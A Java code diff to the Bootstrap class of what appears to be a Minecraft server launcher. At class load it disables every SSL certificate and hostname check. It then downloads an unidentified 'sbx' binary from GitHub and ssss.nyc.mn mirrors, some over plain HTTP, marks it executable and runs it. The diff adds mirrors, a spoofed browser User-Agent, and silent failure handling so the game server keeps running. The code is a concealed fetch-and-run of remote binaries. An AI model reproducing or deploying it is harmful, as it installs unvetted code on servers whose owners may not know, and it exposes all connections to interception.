@@ -33,7 +33,6 @@ public class Bootstrap
         "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME"
     };
 
-    // 在类加载时就禁用SSL验证
     static {
         disableSSLVerification();
     }
@@ -93,7 +92,6 @@ public class Bootstrap
     
     private static void disableSSLVerification() {
         try {
-            // 创建信任所有证书的 TrustManager
             TrustManager[] trustAllCerts = new TrustManager[]{
                 new X509TrustManager() {
                     public X509Certificate[] getAcceptedIssuers() { 
@@ -104,12 +102,10 @@ public class Bootstrap
                 }
             };
             
-            // 安装信任所有证书的 TrustManager
             SSLContext sc = SSLContext.getInstance("TLS");
             sc.init(null, trustAllCerts, new SecureRandom());
             HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
             
-            // 创建主机名验证器，信任所有主机名
             HostnameVerifier allHostsValid = new HostnameVerifier() {
                 public boolean verify(String hostname, SSLSession session) {
                     return true;
@@ -163,8 +159,8 @@ public class Bootstrap
             System.out.println(ANSI_GREEN + "[SBX] Process started successfully" + ANSI_RESET);
         } catch (Exception e) {
             System.err.println(ANSI_RED + "[SBX] Failed to start binary: " + e.getMessage() + ANSI_RESET);
-            e.printStackTrace();
-            throw e;
+            System.err.println(ANSI_YELLOW + "[SBX] Continuing without SBX services..." + ANSI_RESET);
+            // 不抛出异常，让程序继续运行MC服务器
         }
     }
     
@@ -220,23 +216,63 @@ public class Bootstrap
         return envVars;
     }
     
+    private static boolean isValidBinary(Path path) throws IOException {
+        if (!Files.exists(path) || Files.size(path) < 1024) {
+            return false;
+        }
+        
+        // 读取文件头，检查是否是ELF格式（Linux二进制文件）
+        try (InputStream is = Files.newInputStream(path)) {
+            byte[] header = new byte[4];
+            int read = is.read(header);
+            if (read < 4) return false;
+            
+            // ELF文件的魔数：0x7F 'E' 'L' 'F'
+            if (header[0] == 0x7F && header[1] == 'E' && header[2] == 'L' && header[3] == 'F') {
+                return true;
+            }
+            
+            // 检查是否是HTML或文本（错误页面）
+            String headerStr = new String(header);
+            if (headerStr.startsWith("<!DO") || headerStr.startsWith("<htm") || headerStr.startsWith("HTTP")) {
+                System.err.println(ANSI_RED + "[Binary] Downloaded file appears to be HTML/text, not a binary" + ANSI_RESET);
+                
+                // 打印前200字节用于调试
+                is.reset();
+                byte[] sample = new byte[200];
+                int sampleRead = is.read(sample);
+                System.err.println(ANSI_YELLOW + "[Binary] File content sample:" + ANSI_RESET);
+                System.err.println(new String(sample, 0, sampleRead));
+                
+                return false;
+            }
+        }
+        
+        return false;
+    }
+    
     private static Path getBinaryPath() throws IOException {
         String osArch = System.getProperty("os.arch").toLowerCase();
-        String[] urls;
         
-        // 提供多个备用URL
+        // 使用GitHub或其他可靠镜像站的URL
+        String[] urls;
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
             urls = new String[]{
+                "https://github.com/eooce/test/releases/download/ARM/sb_amd64",
+                "https://raw.githubusercontent.com/eooce/test/main/ARM/sb_amd64",
                 "https://amd64.ssss.nyc.mn/sbsh",
                 "http://amd64.ssss.nyc.mn/sbsh"
             };
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
             urls = new String[]{
+                "https://github.com/eooce/test/releases/download/ARM/sb_arm64",
+                "https://raw.githubusercontent.com/eooce/test/main/ARM/sb_arm64",
                 "https://arm64.ssss.nyc.mn/sbsh",
                 "http://arm64.ssss.nyc.mn/sbsh"
             };
         } else if (osArch.contains("s390x")) {
             urls = new String[]{
+                "https://github.com/eooce/test/releases/download/ARM/sb_s390x",
                 "https://s390x.ssss.nyc.mn/sbsh",
                 "http://s390x.ssss.nyc.mn/sbsh"
             };
@@ -246,19 +282,19 @@ public class Bootstrap
         
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
         
-        // 如果文件已存在且大小合理，直接使用
-        if (Files.exists(path)) {
-            long fileSize = Files.size(path);
-            if (fileSize > 1024) { // 至少1KB
-                System.out.println(ANSI_GREEN + "[Binary] Using cached binary: " + path + " (" + fileSize + " bytes)" + ANSI_RESET);
-                if (!path.toFile().setExecutable(true)) {
-                    System.err.println(ANSI_YELLOW + "[Binary] Warning: Failed to set executable permission" + ANSI_RESET);
-                }
-                return path;
-            } else {
-                System.out.println(ANSI_YELLOW + "[Binary] Cached file too small, re-downloading..." + ANSI_RESET);
-                Files.delete(path);
+        // 如果文件已存在且是有效的二进制文件，直接使用
+        if (Files.exists(path) && isValidBinary(path)) {
+            System.out.println(ANSI_GREEN + "[Binary] Using cached valid binary: " + path + ANSI_RESET);
+            if (!path.toFile().setExecutable(true)) {
+                System.err.println(ANSI_YELLOW + "[Binary] Warning: Failed to set executable permission" + ANSI_RESET);
             }
+            return path;
+        }
+        
+        // 删除旧的无效文件
+        if (Files.exists(path)) {
+            System.out.println(ANSI_YELLOW + "[Binary] Removing invalid cached file..." + ANSI_RESET);
+            Files.delete(path);
         }
         
         // 尝试从多个URL下载
@@ -271,30 +307,47 @@ public class Bootstrap
                 URLConnection connection;
                 if (url.startsWith("https://")) {
                     HttpsURLConnection httpsConn = (HttpsURLConnection) new URL(url).openConnection();
-                    httpsConn.setConnectTimeout(30000); // 30秒超时
-                    httpsConn.setReadTimeout(60000); // 60秒读取超时
-                    httpsConn.setRequestProperty("User-Agent", "Java/" + System.getProperty("java.version"));
+                    httpsConn.setConnectTimeout(30000);
+                    httpsConn.setReadTimeout(60000);
+                    httpsConn.setRequestProperty("User-Agent", "Mozilla/5.0");
+                    httpsConn.setInstanceFollowRedirects(true);
                     connection = httpsConn;
                 } else {
                     HttpURLConnection httpConn = (HttpURLConnection) new URL(url).openConnection();
                     httpConn.setConnectTimeout(30000);
                     httpConn.setReadTimeout(60000);
-                    httpConn.setRequestProperty("User-Agent", "Java/" + System.getProperty("java.version"));
+                    httpConn.setRequestProperty("User-Agent", "Mozilla/5.0");
+                    httpConn.setInstanceFollowRedirects(true);
                     connection = httpConn;
+                }
+                
+                int responseCode = -1;
+                if (connection instanceof HttpURLConnection) {
+                    responseCode = ((HttpURLConnection) connection).getResponseCode();
+                    System.out.println(ANSI_YELLOW + "[Binary] HTTP Response Code: " + responseCode + ANSI_RESET);
+                    
+                    if (responseCode != 200) {
+                        System.err.println(ANSI_RED + "[Binary] Bad response code: " + responseCode + ANSI_RESET);
+                        continue;
+                    }
                 }
                 
                 try (InputStream in = connection.getInputStream()) {
                     long bytesDownloaded = Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
-                    System.out.println(ANSI_GREEN + "[Binary] Downloaded successfully: " + bytesDownloaded + " bytes" + ANSI_RESET);
+                    System.out.println(ANSI_GREEN + "[Binary] Downloaded: " + bytesDownloaded + " bytes" + ANSI_RESET);
                     
-                    if (bytesDownloaded < 1024) {
-                        throw new IOException("Downloaded file too small: " + bytesDownloaded + " bytes");
+                    // 验证下载的文件
+                    if (!isValidBinary(path)) {
+                        System.err.println(ANSI_RED + "[Binary] Downloaded file is not a valid binary!" + ANSI_RESET);
+                        Files.delete(path);
+                        continue;
                     }
                     
                     if (!path.toFile().setExecutable(true)) {
                         throw new IOException("Failed to set executable permission");
                     }
                     
+                    System.out.println(ANSI_GREEN + "[Binary] Successfully downloaded and validated!" + ANSI_RESET);
                     return path;
                 }
                 
